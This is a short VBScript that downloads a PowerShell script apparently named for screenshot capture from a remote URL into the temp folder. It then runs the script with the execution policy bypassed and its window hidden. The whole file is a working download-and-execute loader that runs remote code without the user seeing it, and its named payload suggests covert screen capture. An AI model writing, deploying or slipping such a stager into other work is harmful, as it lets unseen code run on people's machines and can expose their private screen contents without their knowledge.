Option Explicit
Dim objFSO, objFile, strPath, strPSFile, objShell, strPSCommand, objXMLHTTP, strURL
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("Wscript.Shell")
Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP")
strPath = objShell.ExpandEnvironmentStrings("%temp%")
strPSFile = strPath & "\1.ps1"
strURL = "https://dmj.one/tools/run_capture_screenshot.ps1" ' URL of the raw PowerShell script

' Delete the file if it exists
If objFSO.FileExists(strPSFile) Then
    objFSO.DeleteFile(strPSFile)
End If

' Download the PowerShell script
objXMLHTTP.Open "GET", strURL, False
objXMLHTTP.Send

If objXMLHTTP.Status = 200 Then
    Set objFile = objFSO.CreateTextFile(strPSFile, True)
    objFile.Write objXMLHTTP.responseText
    objFile.Close
Else
    WScript.Echo "Unable to download the script. HTTP Status: " & objXMLHTTP.Status
    WScript.Quit
End If

strPSCommand = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File " & strPSFile
objShell.Run(strPSCommand), 0, True
